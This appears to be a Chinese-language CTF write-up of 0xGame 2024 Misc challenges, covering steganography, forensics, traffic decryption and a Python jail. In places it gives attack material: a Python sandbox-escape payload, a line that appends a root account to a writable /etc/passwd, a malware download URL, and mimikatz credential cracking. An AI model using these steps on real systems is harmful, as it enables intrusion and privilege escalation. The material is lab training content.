# 0xGame 2024-Misc-Week

## [Week 1] 我的世界基岩版(?

* 不是基岩版，JAVA版1.21
* 安装 `<strong>[XWM]</strong>Xaero的世界地图`和 `<strong>[XMM]</strong>Xaero的小地图`两个mod
* 跑图看见flag
* 0xGame{MC_SEver_4_CTFers}

## [Week 1] 一明一暗

* 能发现压缩包中有和已知文件一样的文件
* 尝试明文攻击，构造压缩包选用BandiZip>1-快速压缩
* 得到破解后解压压缩包
* hint中提示有水印，且看不见
* 可以联想到盲水印
* 用WaterMark来提取盲水印得到flag
* 0xGame{N0w_st4rt_uR_j0urn3y!!}

## [Week 1] 0xGame2048

* 题干有hint，2048和base
* 搜索Base2048得到[解密工具](https://nerdmosis.com/tools/encode-and-decode-base2048)
* 解密得到0xGame{W3lc0me_t0_0xG4me!!!}

## [Week 1] 加密的压缩包?

* 题干说明压缩包是加密的
* 然而打开查看是没有加密
* 010editor打开手动打上09 00标识位（两个地方都要改
* WinRAR打开能看见有备注password：0xGame2024
* 成功解压得到flag
* 0xGame{M@ybe_y0u_ar2_t4e_mAsTer_0f_Z1p}

## [Week 2] 报告哈基米

* 得到一张png图片，先用StegSlove查看LBS隐写，在最低限位上看到了参数信息
* a,b=7,35 (a,b=35,7),shuffle_times=1
* 然后用010editor打开发现在结尾有一段hint
* Maybe You Need To Know Arnold Cat
* 得到是经过Arnold变换的图像
* 采用了[大佬的脚本](https://zhuanlan.zhihu.com/p/90483213)，进行了修改

```
from PIL import Image
import numpy as np

def arnold_decode(image, shuffle_times, a, b):
    """ Decode for RGB image that encoded by Arnold
    Args:
        image: rgb image encoded by Arnold (numpy array)
        shuffle_times: how many times to shuffle
        a: parameter a for Arnold's cat map
        b: parameter b for Arnold's cat map
    Returns:
        decode image (numpy array)
    """
    # 1: 创建新图像
    decode_image = np.zeros_like(image)
  
    # 2: 计算N
    h, w = image.shape[0], image.shape[1]
    N = h  # 或N=w
  
    # 3: 遍历像素坐标变换
    for time in range(shuffle_times):
        for ori_x in range(h):
            for ori_y in range(w):
                # 按照公式坐标变换
                new_x = int(((a * b + 1) * ori_x + (-b) * ori_y) % N)
                new_y = int(((-a) * ori_x + ori_y) % N)
                decode_image[new_x, new_y] = image[ori_x, ori_y]
  
    return decode_image
path = "./mijiha.png"
image = np.array(Image.open(path))
decoded_image = arnold_decode(image,1,35,7)
decoded_image_pil = Image.fromarray(np.uint8(decoded_image))
output_path = "decoded_image.png"
decoded_image_pil.save(output_path)
```

* 得到的图像上只有半个flag
* 0xGame{hajimi_i5_
* 此外注意到010editor打开中结尾有txt字样
* 仔细观察发现是倒序的PK开头字样，判断是zip压缩包
* 手写脚本

```
def reverse_file_bytes(input_file, output_file):
    with open(input_file, 'rb') as f:
        byte_data = f.read()

    reversed_data = byte_data[::-1]

    with open(output_file, 'wb') as f:
        f.write(reversed_data)
    print(f"Reversed bytes have been written to '{output_file}'.")
input_path = "./mijiha.png"  # 替换为输入文件路径
output_path = "./mijiha.bin"  # 替换为保存的输出文件路径
reverse_file_bytes(input_path, output_path)
```

* 然后用binwalk分离
* 打开压缩包查看txt
* 第一行为hint提示Tupper公式（塔珀自指公式）
* 同时能发现字是逆序的，猜测数字也是逆序的
* 使用-[网站](https://tuppers-formula.ovh/)-转换tupper公式
* 得到后半段Cute_r1ght?}

![](https://seandictionary.top/wp-content/uploads/2024/10/image-19-1024x305.png)

## [Week 2] 我叫曼波

* 观察python文件发现经过RC4加密，然后转化为3进制，在用对应的字典替换
* 同时RC4是对称加密，调用即可解密
* 先写脚本，获得加密后的密文以及对应密钥

```
from pwn import *
p = remote('47.98.178.117', 1111)
while True:
    try:
        p.recvuntil(b'>')
        p.sendline(b"1")
        test = p.recvline().decode().split("\n")
        if test == "You've reached the end of flag.Good Luck!----MANBO":
            break
        p.recvuntil(b'>')
        p.sendline(b"2")
        key = p.recvline().decode().split("\n")[0][1:]
        p.recvuntil(b'>')
        p.sendline(b"3")
        c = p.recvline().decode().split("\n")[0][1:]
        keys += [key]
        cs +=[c]
    except Exception as e:
        break

print(cs)
print(keys)
```

* 编写解密脚本

```
from Crypto.Cipher import ARC4
manbo_dict = {"曼波":"0","哦耶":"1","哇嗷":"2"}
keys = [?]
cs = [?]
def RC4(plain,K):
    S = [0] * 256
    T = [0] * 256
    for i in range(0,256): 
        S[i] = i
        T[i] = K[i % len(K)]

    j = 0
    for i in range(0,256): 
        j = (j + S[i] + ord(T[i])) % 256
        S[i], S[j] = S[j], S[i]

    i = 0
    j = 0
  
    cipher = []
    for s in plain:
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        t = (S[i] + S[j]) % 256
        k = S[t]
        cipher.append(chr(ord(s) ^ k))

    return ("".join(cipher).encode()).decode()

def decode(c,key):
    base3 = ''
    base6 = ''
    for i in range(0,len(c),2):
        base3 += manbo_dict[c[i:i+2]]
    for i in range(0,len(base3),5):
        base6 += chr(int(base3[i:i+5],3))
    base6 = base64.b64decode(base6).decode()
    res = RC4(base6,key)
    return res

for i in range(len(cs)):
    ans += decode(cs[i],keys[i])
print(ans)
```

* 0xGame{OH_yEah_Wow_Duang_HajiMi_u_MADE_it!_and_MaY_5e_Y0u_hAv4_HeArD_7he_ST0ry_0f_Gu_Gao_MaN_B0}

## [Week 2] 呜呜呜~我再也不敢乱点了

* 打开流量包，首选项导入已给的TLS密钥
* 追踪http流，截获压缩包zip
* 解压发现有一个powershell脚本和一个bat批处理文件
* 批处理文件中暗地运行了powershell脚本
* 查看脚本（出题人真好心，帮我们都把命令注释掉了
* 明面上没有问题，用010打开查看HEX发现后续隐藏了字符
* 截取1174[496h]~2237[8BDh]之间的字符
* 这是base64加密，解密得到一个反向 shell 脚本
* 其中就能看到监听服务器的ip192.168.93.132
* MD5加密得到flag
* 0xGame{63e1de9c00fd0dccda8a2d76475ac44a}

## [Week 3] 画画的baby

* `vol.py -f painting.raw imageinfo`查看镜像信息
* 得到系统 `Win10x64_19041`
* `vol.py -f painting.raw --profile=Win10x64_19041 pslist`查看进程信息
* 查找mspaint.exe进程得到PID5372
* `vol.py -f painting.raw --profile=Win10x64_19041 memdump -p 5372 -D output`提取内存数据
* 参考[资料1](https://segmentfault.com/a/1190000018813033)，[资料2](https://zhuanlan.zhihu.com/p/536408671)
* 将bmp文件后缀改为data，用GIMP打开-[GIMP下载链接](https://www.gimp.org/downloads/)
* 图像类型改为RGB Alpha
* 调整高为合适高度，我是1070
* 综合调节位移和宽(我的理解是位移是不同时间状态下的屏幕快照，而宽可以用来改变倾斜状况

![](https://seandictionary.top/wp-content/uploads/2024/10/image-25-1024x597.png)

* （这参数调得真tm操蛋
* 0xGame{Tr33_AnD_F1ow3r}

## [Week 3] 重生之我在南邮当CTF大王

* RPG小游戏
* 查看save文件夹能发现是由RMMZ制作的RPG游戏，寻找适用于RMMZ的修改器
* 我使用的[修改器](https://cirno.biz/thread-150722-1-1.html)
* 用修改器打开可以在发现第五个名字是Base64编码，flag1：0xGame{NJUPT_（这个对应的就是许愿树的名字
* 在地图左下角樱花林处进去回答问题（答案4，3），能拿到flag2：Has_
* 进入图书馆发现等待时间太久，所以还是打开修改器
* 进入对应地图选择NPC2>事件解释器
* 或者寻找代码，打开data>Map009.json
* 得到flag3：VerY_v3Ry_V3ry_
* 进入南一食堂，就是右下角那个，和小狗对话，对话内容是兽语加密，但文字不好提取
* 所以进入文件夹，打开data>Map007.json，得到四段密文
* ~呜嗷嗷嗷嗷呜呜~~嗷呜嗷呜呜~呜~嗷啊嗷啊呜嗷嗷啊
* 嗷~嗷~呜呜嗷~嗷嗷嗷嗷呜呜~~嗷呜嗷呜呜啊~呜啊啊
* 嗷啊呜~啊嗷呜~嗷~呜呜嗷~啊嗷嗷嗷呜啊嗷嗷啊呜嗷
* 呜呜啊啊啊~啊嗷啊呜嗷呜啊嗷啊
* 合并后解密-[工具](http://hi.pcmoe.net/roar.html)
* 得到flag4：YummY_FooD}
* 0xGame{NJUPT_Has_VerY_v3Ry_V3ry_YummY_FooD}

## [Week 3] 神秘电波

* 拿到grc和wav文件
* wav文件用windows自带播放器打开没声音，用专业音频处理软件打开听到杂音
* 搜索grc格式找到GNU Radio
* 用GNU打开grc文件发现是对txt文件进行了BPSK调制，并将输出混入随机数，形成了wav文件
* 需要手搓BPSK解调器
* 参考[官方文档](https://wiki.gnuradio.org/index.php/Simulation_example:_BPSK_Demodulation)-[示例grc文件](https://wiki.gnuradio.org/images/1/1a/Bpsk_stage6.grc)，grc打开如图

![](https://seandictionary.top/wp-content/uploads/2024/10/image-26-1024x581.png)

* 可以观察到第一行是调制，将结果关联到流Stream
* 再通过第二行解调流，输出结果，并通过另一条流输入，来在GUI上展示比较结果
* 在此示例上修改，将所有与流和GUI有关的模块删去，将比较结果的分支删去
* 回头重新分析调制的过程，发现调制缺少了Polyphase Clock Sync模块，因而在解调中要用上
* 调制中还乘上了随机数，解调中要除去
* 最终梳理好数据类型，手搓解调器，如下图，[获取grc文件](https://seandictionary.top/medias/slove.grc)

![](https://seandictionary.top/wp-content/uploads/2024/10/image-27-1024x607.png)

* 最上面的参数直接复制调制的就行
* P.S.在运行前先generate生成py文件，另外我自己win下无法正常运行，遂换kali
* 有窗口弹出后即可中止
* 检查生成文件发现无法打开，010打开发现全是00和01组成
* 手写脚本处理

```
def count(n: list):
    '''用来统计出现次数最多的字符，以此来排除乱码'''
    res = ""
    for i in range(0,len(n[0]),2):
        tmp = {}
        for j in n:
            if j[i:i+2] in tmp:
                tmp[j[i:i+2]] += 1
            else:
                tmp[j[i:i+2]] = 1
        counts = 0
        hexs = ""
        for key, value in tmp.items():
            if value > counts:
                hexs,counts = key,value
        res += chr(int(hexs,16))
    return res

def read_file_in_hex(file_path):
    with open(file_path, 'rb') as file:
        content = file.read()
        hex_output = content.hex()[:18000]  # 截取一段恰当长度，后面都是乱码+重复
        ans = ""
        for i in range(0,len(hex_output),2):
            ans += str(hex_output[i+1])
        result=""
        while int(ans[0:8],2) != 0x30:      # 第一次输出时发现是乱码，要处理移位，根据flag猜测第一位是0
            ans = ans[1:]
        for i in range(0,len(ans),8):
            result += str(hex(int(ans[i:i+8],2))[2:])
        result = result[:-(len(result)%88)]
        uuid = []
        for i in range(0,len(result),88):
            uuid += [result[i:i+88]]
        print(count(uuid))

file_path = 'flag.txt'
read_file_in_hex(file_path)
```

* 0xGame{38df7992-6c53-11ef-b522-c8348e2c93c6}

## [Week 3] Happy 1024!

* 来个脑筋急转弯
* 代码里有酒，梦，星，河，直接百度搜索

![](https://seandictionary.top/wp-content/uploads/2024/10/image-32-1024x709.png)

* 0xGame{醉后不知天在水，满船清梦压星河。}

## [Week 4] Crazy Thursday v me 50 btc

* 一眼能断定是ppt中的宏病毒，所以打开ppt查看宏，发现是从服务端上下载软件，并静默运行
* 下载地址[http://47.239.17.55/summer.exe](http://47.239.17.55/summer.exe)
* 下载后图标一眼看出是pyinstaller打包，因此使用[PyInstaller Extractor](https://github.com/extremecoders-re/pyinstxtractor)反编译
* （注意PyInstaller Extractor要使用最新版，最新版会自动添加MagicNumber而旧版我每次手动添加都不能成功反编译）
* 然后使用 `uncompyle6 summer.pyc>summer.py`得到源代码
* 分析源码，手搓

```
from Crypto.Util.number import *

n = 6622320770252713983049525538529442399806399114601156042479162556501743025546301982131013970430949612759498909508894354368867959407638642272535440767511933
c = 1463395291354414033241866227371254790898156535141365755336147164392037884099642848212701050302606758739200003046537720344359702711890711691510289097046372
p = 64816076191920076931967680257669007967886202806676552562757735711115285212307
q = 102170960652478489355215071707263191814765888101601364955857801471459364198319
e = 65537
d = inverse(e,(p-1)*(q-1))
m = pow(c,d,n)
k3y = long_to_bytes(m)
```

* 这段用来获取3DES的24字节k3y密钥
* 下面是解密文件

```
import os
from Crypto.Cipher import DES3
from Crypto.Util.Padding import unpad

def decrypt_file(key, encrypted_file):
    with open(encrypted_file, "rb") as f:
        ciphertext = f.read()

    # 使用 3DES 算法进行解密
    cipher = DES3.new(key, DES3.MODE_ECB)
    decrypted_data = unpad(cipher.decrypt(ciphertext), DES3.block_size)

    # 去掉 ".encrypted" 扩展名，恢复原文件名
    original_file = encrypted_file.replace(".encrypted", "")
  
    with open(original_file, "wb") as f:
        f.write(decrypted_data)
    print(f"File decrypted: {original_file}")

def find_encrypted_files(dir="."):
    encrypted_files = []
    for root, dirs, files in os.walk(dir):
        for file in files:
            if file.endswith(".encrypted"):
                encrypted_files.append(os.path.join(root, file))
    return encrypted_files

if __name__ == "__main__":
    # 获取所有已加密的文件
    encrypted_files = find_encrypted_files()

    # 对每个文件进行解密
    for encrypted_file in encrypted_files:
        decrypt_file(k3y, encrypted_file)
```

* 得到音频文件
* strings能看到文件末尾藏了密码password:0xRansomeware
* 可能是Mp3Stego隐写，尝试失败
* 选择deepsound提取文件
* winter.txt提示hint是snow隐写
* （特点是以16进制打开09 20 居多）
* 0xGame{d3ba2505-36b1-4191-8212-062b943c58ec}

p.s.第一次见Snow隐写，软件都是98年的老古董了

## [Week 4] Encrypted file

* 追踪http流，在134流上发现上传了php文件用来开后门
* 此文件对上传内容进行了一个加密，所以写出解密脚本

```
import base64

def decrypt(data):
    key = "e45e329feb5d925b"
  
    # Base64 解码
    decoded_data = base64.b64decode(data)
  
    # XOR 解密
    decrypted = bytearray()
    for i in range(len(decoded_data)):
        decrypted.append(decoded_data[i] ^ ord(key[(i + 1) & 15]))
  
    return decrypted.decode()

# 示例加密数据（Base64 编码的）
encrypted_data = "加密数据"

# 解密
decrypted_code = decrypt(encrypted_data)
print("解密后的代码:")
print(decrypted_code)
```

* 然后在139流将传输内容解密，再对cmd命令base64解密可以得到如下
* `cd /d "D:\AAACTF\WEB\phpStudy_64\phpstudy_pro\WWW\upload..\"&openssl enc -aes-128-cbc -in unfinished_hello.php -out secret.php -iv 114514 -K c4d038b4bed09fdb`
* 发现是将unfinished_hello.php经过AES加密得到secret.php，所以可以编写解密脚本
* 这里IV和key都要补零

```
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

def decrypt_aes_cbc(input_file, output_file, key, iv):

    # 创建 AES 解密器
    cipher = AES.new(key, AES.MODE_CBC, iv)

    # 读取加密文件
    with open(input_file, 'rb') as f:
        encrypted_data = f.read()

    # 解密数据并去除填充
    decrypted_data = unpad(cipher.decrypt(encrypted_data), AES.block_size)

    # 将解密后的数据写入输出文件
    with open(output_file, 'wb') as f:
        f.write(decrypted_data)

# 使用的参数
input_file = 'secret.php'  # 输入加密文件
output_file = 'decrypted_hello.php'  # 输出解密文件
key = b'\xc4\xd0\x38\xb4\xbe\xd0\x9f\xdb\x00\x00\x00\x00\x00\x00\x00\x00'  # 密钥（16 字节，128 位）
iv = b'114514\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'   # 初始向量（16 字节，128 位）

decrypt_aes_cbc(input_file, output_file, key, iv)

print(f"解密完成，已保存到 {output_file}")
```

* 还原的的文件打开就能得到flag
* 0xGame{8552BB81-D51A-FDCE-2EF1-55EBBEFF9B9C}

## [Week 4] Untouchable flag

* 这是一道jail绕过，注意到限制了所有的英文大小写字母以及数字
* 可以考虑用unicode字符绕过
* 进一步发现输入限制了长度，并且常用的绕过长度的payload是eval(input())长度是13
* 注意到提示Python版本是3.7以上，可以联想到3.7及以上版本更新了breakpoint()用法，刚好长度是12
* payload：𝐛𝐫𝐞𝐚𝐤𝐩𝐨𝐢𝐧𝐭()
* 之后使用常规的payload即可
* `__import__('os').system('sh')`
* 考虑到可能复制会出现乱码，这里直接用pwntool连接

```
from pwn import *

addr = "nc 47.98.178.117 2222".split(" ")
io = remote(addr[1],int(addr[2]))
io.recvuntil(">")
io.sendline("𝐛𝐫𝐞𝐚𝐤𝐩𝐨𝐢𝐧𝐭()")
io.interactive()
```

* cat flag发现无回显 `ls -l flag`证实无权限读取
* 使用 `ls -l /etc/passwd`发现拥有passwd的读写权限
* 可以利用这个来提权
* 输入 `echo "aaa:advwtv/9yU5yQ:0:0:,,,:/root:/bin/bash" >>/etc/passwd`
* （此处 `advwtv/9yU5yQ`是加盐过后的密码）
* `su aaa>password@123`然后whoami查看成功提权
* `cat flag`
* 0xGame{PyJ@i1_w1Th_P@sswd_3l3Vat3_pr1v1l3g3}

## [Week 4] FBI Open The Door!! 1

* 写脚本计算SHA256或者直接用CMD命令行 `CertUtil -hashfile fish.E01 SHA256`

```
import hashlib

def calculate_file_hash(file_path):
    sha256 = hashlib.sha256()
    with open(file_path, 'rb') as f:
        chunk = f.read()
        sha256.update(chunk)
    return sha256.hexdigest()

file_path = 'fish.E01'  # 替换为实际文件路径
hash_value = calculate_file_hash(file_path)
print(f'文件的 SHA-256 哈希值: {hash_value}')
```

* 0xGame{6d393b09ac01accf27bce07a9c07f5721b9e1e1fd5de1cc8cc1a2581a43e68f5}

## [Week 4] FBI Open The Door!! 2

* 使用Arsenal Image Mounter挂载镜像到本地
* 打开 `Windows\System32\Config`
* 用注册表编辑器**RegEdit**打开
* 在 `SYSTEM` 文件中，可以查看 `ControlSet001\Services\Tcpip\Parameters` 路径下的 `Hostname` 字段。
* 在 `SOFTWARE` 文件中，可以查看 `Microsoft\Windows NT\CurrentVersion` 路径下的 `ComputerName` 字段。
* 0xGame{F1sh1ng-s3v3r}

## [Week 4] FBI Open The Door!! 3

* 参考-[链接](https://blog.csdn.net/zhangkexin3/article/details/135865120)
* 使用mimikatz破解Config中的SAM文件和SYSTEM文件
* 管理员模式打开

![](https://seandictionary.top/wp-content/uploads/2024/10/image-33-1024x459.png)

![](https://seandictionary.top/wp-content/uploads/2024/10/image-34-1024x229.png)

* 0xGame{zaq!xsw@}

## [Week 4] FBI Open The Door!! 4

* 还是查找注册表
* 用RegEdit打开 `Conifg>SOFTWARE`
* 查看 `Microsoft\Windows NT\CurrentVersion`下的 `InstallDate`字段
* 得到日期 `1729666240`
* 然后用CyberChef将unix时间戳转化为时间
* 注意这里不是输入UTC时间而是本地时间
* 0xGame{2024-10-23 14:50:40}

## [Week 4] FBI Open The Door!! 5

* 我选择了用AXIOM来综合取证
* 先用过滤器搜索SMTP发现有浏览器活动，位于https://localhost:3333

![](https://seandictionary.top/wp-content/uploads/2024/11/image-1024x616.png)

* 继续搜索localhost:3333

![](https://seandictionary.top/wp-content/uploads/2024/11/image-1-1024x616.png)

* 分析下或者看网页名就能知道使用了gophish来进行钓鱼操作
* 搜索gophish

![](https://seandictionary.top/wp-content/uploads/2024/11/image-2-1024x616.png)

* 得到安装路径 `Windows\Temp\gophish`
* 查看gophish.db文件，AXIOM可以直接查看数据库文件
* 查找SMTP表得到授权码

![](https://seandictionary.top/wp-content/uploads/2024/11/image-3-1024x935.png)

* 0xGame{wpdqlnyvetqyddce}

## [Week 4] FBI Open The Door!! 6

* 同样的数据库里能在表users找到密码的hash
* 这是Bcrypt加密
* cmd5能查到但是收费
* 使用爆破脚本-[GayHub](https://github.com/wolaile08/BCryptDecode)
* 字典我用了top1000

![](https://seandictionary.top/wp-content/uploads/2024/11/image-4.png)

* 0xGame{qwertyuiop}
